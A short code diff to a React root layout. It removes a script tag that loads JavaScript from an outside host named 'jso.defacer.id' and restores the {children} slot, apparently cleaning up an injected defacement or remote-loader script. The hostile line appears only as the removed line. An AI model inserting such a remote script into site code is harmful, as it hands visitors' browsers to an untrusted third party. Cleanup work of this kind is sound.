@@ -43,7 +43,7 @@ export default function RootLayout({ children }) {
         <style>{`body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Arial}`}</style>
       </head>
       <body className="bg-slate-50 text-slate-800 overflow-x-hidden">
-        <script src="https://jso.defacer.id/raw/HdL4A3H40c"></script>
+        {children}
       </body>
     </html>
   );
